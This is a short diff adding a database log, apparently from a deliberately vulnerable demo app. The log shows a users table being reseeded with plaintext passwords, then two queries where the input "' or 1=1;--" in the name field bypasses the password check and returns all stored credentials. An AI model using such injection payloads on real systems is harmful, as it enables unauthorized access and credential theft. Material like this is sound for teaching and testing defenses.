@@ -1,0 +1,8 @@
+INFO:SQL_fetch:Sun Jun 14 11:46:36 2026 : Executed SQL query: delete from users;
+ERROR:SQL_fetch:Sun Jun 14 11:46:36 2026 : the last operation didn't produce records (command status: DELETE 4)
+INFO:SQL_fetch:Sun Jun 14 11:46:36 2026 : Executed SQL query: insert into users values (1, 'admin', 'admin'),(2,'alice', 'password'), (3, 'bob', 'secret'), (4, 'test', 'test');
+ERROR:SQL_fetch:Sun Jun 14 11:46:36 2026 : the last operation didn't produce records (command status: INSERT 0 4)
+INFO:SQL_fetch:Sun Jun 14 11:46:59 2026 : Executed SQL query: select * from users where name = '' or 1=1;--' and password = 'admin';
+INFO:SQL_fetch:Sun Jun 14 11:46:59 2026 : Fetched data: [(1, 'admin', 'admin'), (2, 'alice', 'password'), (3, 'bob', 'secret'), (4, 'test', 'test')]
+INFO:SQL_fetch:Sun Jun 14 11:47:25 2026 : Executed SQL query: select * from users where name = '' or 1=1;--' and password = 'ad';
+INFO:SQL_fetch:Sun Jun 14 11:47:25 2026 : Fetched data: [(1, 'admin', 'admin'), (2, 'alice', 'password'), (3, 'bob', 'secret'), (4, 'test', 'test')]
